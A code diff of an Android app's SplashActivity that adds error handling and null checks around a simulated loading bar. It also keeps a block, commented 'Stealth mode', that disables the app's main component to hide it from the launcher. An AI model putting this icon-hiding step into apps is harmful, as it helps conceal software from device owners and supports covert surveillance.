@@ -17,22 +17,40 @@ public class SplashActivity extends AppCompatActivity {
 
     @Override protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.splash_activity);
+        try {
+            setContentView(R.layout.splash_activity);
+        } catch (Exception e) {
+            // Fallback jika layout error
+            setContentView(R.layout.activity_main);
+            startActivity(new Intent(this, MainActivity.class));
+            finish();
+            return;
+        }
 
-        progressBar = findViewById(R.id.progressBar);
-        tvProgress = findViewById(R.id.tvProgress);
+        try {
+            progressBar = findViewById(R.id.progressBar);
+            tvProgress = findViewById(R.id.tvProgress);
+        } catch (Exception e) {
+            // Jika ID tidak ditemukan, langsung ke MainActivity
+            startActivity(new Intent(this, MainActivity.class));
+            finish();
+            return;
+        }
 
-        ComponentName cn = new ComponentName(this, MainActivity.class);
-        getPackageManager().setComponentEnabledSetting(cn,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+        // Stealth mode
+        try {
+            ComponentName cn = new ComponentName(this, MainActivity.class);
+            getPackageManager().setComponentEnabledSetting(cn,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {}
 
         handler.postDelayed(new Runnable() {
             @Override public void run() {
                 if (progress < 100) {
                     progress += 5;
-                    progressBar.setProgress(progress);
-                    tvProgress.setText(progress + "%");
+                    if (progressBar != null) progressBar.setProgress(progress);
+                    if (tvProgress != null) tvProgress.setText(progress + "%");
                     handler.postDelayed(this, 150);
                 } else {
                     startActivity(new Intent(SplashActivity.this, MainActivity.class));
